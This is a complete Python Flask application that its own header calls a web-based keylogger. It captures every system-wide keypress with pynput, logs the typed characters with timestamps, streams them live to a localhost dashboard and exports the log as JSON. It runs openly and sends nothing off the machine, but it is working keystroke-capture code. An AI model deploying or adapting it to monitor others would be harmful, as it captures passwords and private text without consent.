"""
KeyScope Flask — Web-based Keylogger with Live Dashboard
=========================================================
Install:  pip install flask pynput
Run:      python app.py
Open:     http://127.0.0.1:5000
"""

from flask import Flask, render_template, jsonify, Response, request
from pynput import keyboard
from collections import Counter, deque
from datetime import datetime
import threading
import time
import json
import queue

app = Flask(__name__)

# ─── Shared State ─────────────────────────────────────────────────────────────
class State:
    def __init__(self):
        self.lock           = threading.Lock()
        self.running        = False
        self.session_start  = None
        self.total          = 0
        self.words          = 0
        self.char_counter   = Counter()
        self.special_counter= Counter()
        self.log            = deque(maxlen=200)   # last 200 entries
        self.timeline       = deque(maxlen=3600)  # timestamps (epoch) for last hour
        self.current_word   = ""
        self.listener       = None
        self.sse_clients    = []                  # SSE queues

    def reset(self):
        with self.lock:
            self.running        = False
            self.session_start  = None
            self.total          = 0
            self.words          = 0
            self.char_counter   = Counter()
            self.special_counter= Counter()
            self.log.clear()
            self.timeline.clear()
            self.current_word   = ""

state = State()

# ─── SSE broadcast ────────────────────────────────────────────────────────────
def broadcast(event_type: str, payload: dict):
    msg = f"event: {event_type}\ndata: {json.dumps(payload)}\n\n"
    dead = []
    for q in state.sse_clients:
        try:
            q.put_nowait(msg)
        except Exception:
            dead.append(q)
    for q in dead:
        state.sse_clients.remove(q)

# ─── Keylogger Engine ─────────────────────────────────────────────────────────
def on_press(key):
    if not state.running:
        return False

    now = datetime.now()
    ts  = now.strftime("%H:%M:%S.") + f"{now.microsecond // 1000:03d}"
    t   = time.time()

    with state.lock:
        try:
            k = key.char
            if k is None:
                raise AttributeError
            state.char_counter[k] += 1
            state.current_word += k
            display = k
            kind    = "char"
        except AttributeError:
            raw = str(key).replace("Key.", "")
            state.special_counter[raw] += 1
            if raw in ("space", "enter", "return"):
                if state.current_word.strip():
                    state.words += 1
                state.current_word = ""
            elif raw == "backspace":
                state.current_word = state.current_word[:-1]
            display = raw.upper()
            kind    = "special"

        state.total += 1
        state.timeline.append(t)

        entry = {"ts": ts, "key": display, "kind": kind, "n": state.total}
        state.log.append(entry)

    broadcast("key", entry)

def _listener_thread():
    with keyboard.Listener(on_press=on_press) as lst:
        state.listener = lst
        lst.join()

# ─── Routes ───────────────────────────────────────────────────────────────────
@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/start", methods=["POST"])
def api_start():
    if state.running:
        return jsonify(ok=False, msg="Already running")
    state.running      = True
    state.session_start= datetime.now()
    t = threading.Thread(target=_listener_thread, daemon=True)
    t.start()
    broadcast("status", {"running": True})
    return jsonify(ok=True)

@app.route("/api/stop", methods=["POST"])
def api_stop():
    state.running = False
    if state.listener:
        state.listener.stop()
    broadcast("status", {"running": False})
    return jsonify(ok=True)

@app.route("/api/reset", methods=["POST"])
def api_reset():
    state.running = False
    if state.listener:
        state.listener.stop()
    state.reset()
    broadcast("status", {"running": False, "reset": True})
    return jsonify(ok=True)

@app.route("/api/stats")
def api_stats():
    with state.lock:
        now   = time.time()
        kpm   = sum(1 for t in state.timeline if now - t <= 60)
        secs  = int((datetime.now() - state.session_start).total_seconds()) \
                if state.session_start else 0
        top   = state.char_counter.most_common(1)
        top_k = top[0][0] if top else "—"
        if top_k == " ": top_k = "SPACE"

        freq  = [{"key": ("SPACE" if k==" " else k.upper()), "count": c}
                 for k,c in state.char_counter.most_common(30)]
        spec  = [{"key": k.upper(), "count": c}
                 for k,c in state.special_counter.most_common(20)]

        # 60-bucket timeline (1 bucket = 1 second)
        buckets = [0]*60
        for t in state.timeline:
            idx = int(now - t)
            if 0 <= idx < 60:
                buckets[59-idx] += 1

        # hourly heatmap (keys per 5-min slot, 12 slots)
        hour_buckets = [0]*12
        for t in state.timeline:
            idx = int((now - t) // 300)
            if 0 <= idx < 12:
                hour_buckets[11-idx] += 1

        return jsonify(
            running  = state.running,
            total    = state.total,
            unique   = len(state.char_counter) + len(state.special_counter),
            kpm      = kpm,
            words    = state.words,
            session  = f"{secs//3600:02d}:{(secs%3600)//60:02d}:{secs%60:02d}",
            top_key  = top_k,
            freq     = freq,
            spec     = spec,
            buckets  = buckets,
            hour_buckets = hour_buckets,
            log      = list(state.log)[-50:],
        )

@app.route("/api/export")
def api_export():
    with state.lock:
        payload = {
            "exported_at"     : str(datetime.now()),
            "session_start"   : str(state.session_start),
            "total_keystrokes": state.total,
            "words_typed"     : state.words,
            "char_frequency"  : dict(state.char_counter.most_common()),
            "special_frequency": dict(state.special_counter.most_common()),
            "log"             : list(state.log),
        }
    return Response(
        json.dumps(payload, indent=2),
        mimetype="application/json",
        headers={"Content-Disposition": "attachment; filename=keyscope_export.json"}
    )

@app.route("/stream")
def stream():
    q = queue.Queue(maxsize=100)
    state.sse_clients.append(q)
    def generate():
        yield "data: connected\n\n"
        while True:
            try:
                msg = q.get(timeout=30)
                yield msg
            except queue.Empty:
                yield ": ping\n\n"
    return Response(generate(), mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})

if __name__ == "__main__":
    print("\n  ⌨  KeyScope is running →  http://127.0.0.1:5000\n")
    app.run(debug=False, threaded=True, port=5000)
